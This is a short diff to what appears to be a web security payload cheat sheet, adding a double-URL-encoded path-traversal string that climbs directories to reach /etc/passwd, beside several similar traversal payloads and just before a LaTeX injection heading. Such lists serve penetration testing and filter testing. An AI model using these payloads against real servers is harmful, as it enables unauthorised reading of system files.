@@ -248,6 +248,7 @@ file/etc%252Fpasswd/
 file/etc%252Fpasswd%3F/
 file/etc/?/../passwd
 file/etc/%3F/../passwd?
+.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd
 ```
 ---
 # LaTeX injection
